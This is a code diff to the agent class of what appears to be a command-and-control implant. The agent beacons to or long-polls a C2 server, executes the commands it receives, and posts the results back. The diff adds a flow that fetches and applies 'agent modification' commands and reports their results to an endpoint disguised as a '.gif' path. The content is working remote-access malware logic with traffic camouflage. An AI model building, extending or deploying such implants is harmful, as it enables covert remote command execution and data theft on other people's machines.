@@ -61,6 +61,9 @@ class Agent:
         # Modification check sees if we need to request modifications from the server
         self.modification_check = False
 
+    ##TOTAL EXECUTION FUNCTIONS##
+    # The below fucntions handle the entire execution process for beaconining, polling, and agent modificaiton commands
+
     def execute_beacon_chain(self):
         """Executes the entire chain of beaconing including the execution and the sending back of commands
         Returns:
@@ -73,12 +76,75 @@ class Agent:
 
         # The agent checks in to see if commands are available
         commands = self._check_in()
+
         if commands:
+            self.check_for_modification_flag(commands)
             results = self._execute_commands(commands)
             return self._beacon_back(commands, results)
         else:
             # Means that no commands were recieved (or there was a connection erorr and we sleep)
             return False
+
+    def execute_poll_sequence(self):
+        """
+        Function to be called to repeatedly poll the agent, this should be in a while loop of sorts
+        """
+
+        if self.is_beacon():
+            raise ValueError("Long Polling command called on beacon agent")
+
+        # Establish a long polling session
+        self.session = requests.Session()
+
+        commands = self._long_poll()
+
+        if commands:
+            self.check_for_modification_flag(commands)
+            results = self._execute_commands(commands)
+            self._long_poll_back(commands, results)
+            return True
+        else:
+            return False
+
+    def apply_modification_commands(self):
+        """
+        Higher level function that manages the whole flow of applying modification commands
+            - Gets the commands from the server
+            - parses them
+            - Applies them
+
+            Returns:
+                Two parallel arrays which contain a list of the commands that were parsed and executed (or attempted to be) as well as the output
+                    commands - All the commands that were parsed and called
+                    results - the results of those commands
+        """
+
+        unparsed_commands = self.get_modification_commands()
+        if unparsed_commands:
+            results = []
+            clean_commands = self._parse_modification_commands(unparsed_commands)
+            for cmd_type, cmd_value in clean_commands:
+                try:
+                    result = self._handle_modification_command(
+                        cmd_type=cmd_type, cmd_value=cmd_value
+                    )
+                    results.append(result)
+                except Exception as e:
+                    results.append(str(e))
+
+            print(f"This is the results:{results}")
+            print(f"This is the commands:{clean_commands}")
+
+            # Send results back
+            self._send_modification_command_results(unparsed_commands, results)
+
+            self.modification_check = False
+            return True
+        else:
+            # In the case where no commands were found at the agent modification command endpoint
+            self.modification_check = False
+            # send results back that no commands were found
+            return None
 
     def _beacon_back(self, commands, results) -> bool:
         """Beacons back the output of any commands to the C2 server
@@ -156,26 +222,6 @@ class Agent:
             print(f"Unexpecd error: {e}")
 
         return None
-
-    def execute_poll_sequence(self):
-        """
-        Function to be called to repeatedly poll the agent, this should be in a while loop of sorts
-        """
-
-        if self.is_beacon():
-            raise ValueError("Long Polling command called on beacon agent")
-
-        # Establish a long polling session
-        self.session = requests.Session()
-
-        commands = self._long_poll()
-
-        if commands:
-            results = self._execute_commands(commands)
-            self._long_poll_back(commands, results)
-            return True
-        else:
-            return False
 
     def _long_poll(self):
         # long poll url
@@ -273,6 +319,41 @@ class Agent:
 
         return None
 
+    def _send_modification_command_results(self, commands, results):
+        self.session = requests.Session()
+        agent_mod__results_url = f"http://{self.activeDomain}/foew/fjewoj/test.gif"
+        try:
+            payload = {"commands": commands, "results": results}
+            request = self.session.post(url=agent_mod__results_url, json=payload)
+            request.raise_for_status()
+
+            response = request.json()
+            print(response)
+            if response["status"] == "received":
+                return True
+
+        except requests.exceptions.Timeout:
+            print("Request timed out")
+        except requests.exceptions.ConnectionError:
+            print("Connection error occurred")
+        except requests.exceptions.HTTPError as e:
+            print(f"HTTP error: {e}")
+            # Here might be where the watchdog_timer and itnerval timer setting is set up
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+        except Exception as e:
+            print(f"Unexpecd error: {e}")
+
+        return None
+
+    def check_for_modification_flag(self, commands):
+        """
+        Takes a list of execution commands that are pulled from the server and checks agent_modification was called and pulled through
+        """
+        if "agent_modification" in commands:
+            commands.remove("agent_modification")
+            self.modification_check = True
+
     def _execute_commands(self, commands_list):
         """
         Takes a list of commands, and strips them appropriately so that they can be passed to be executed
@@ -318,50 +399,6 @@ class Agent:
             range - +- the interval set on initialization"""
 
         return (self.beacon_inter - range, self.beacon_inter + range)
-
-    # ALL COMMANDS TO MODIFY THE AGENT STATUS AND LEVERAGING THE AGENT STATUS
-    def check_for_modification(self, commands):
-        """
-        Takes a list of execution commands that are pulled from the server and checks agent_modification was called and pulled through
-        """
-        if "agent_modification" in commands:
-            commands.remove("agent_modification")
-
-    def apply_modification_commands(self, commands):
-        """
-        Higher level function that manages the whole flow of applying modification commands
-            - Gets the commands from the server
-            - parses them
-            - Applies them
-
-            Returns:
-                Two parallel arrays which contain a list of the commands that were parsed and executed (or attempted to be) as well as the output
-                    commands - All the commands that were parsed and called
-                    results - the results of those commands
-        """
-
-        unparsed_commands = self.get_modification_commands()
-        if unparsed_commands:
-            results = []
-            clean_commands = self._parse_modification_commands(unparsed_commands)
-            for cmd_type, cmd_value in clean_commands:
-                try:
-                    result = self._handle_modification_command(
-                        cmd_type=cmd_type, cmd_value=cmd_value
-                    )
-                    results.append(result)
-                except Exception as e:
-                    results.append(str(e))
-
-            # Send results back
-
-            self.modification_check = False
-            return commands, results
-        else:
-            # In the case where no commands were found at the agent modification command endpoint
-            self.modification_check = False
-            # send results back that no commands were found
-            return None
 
     def _parse_modification_commands(self, unparsed_commands):
         """
@@ -499,6 +536,7 @@ if __name__ == "__main__":
         # If the modification command boolean is true:
         if agent.is_modify():
             # We call continue here os that if the kill command is passed, we terminate
+            agent.apply_modification_commands()
             continue
 
         # Check to see whether the agent in long polling mode or not
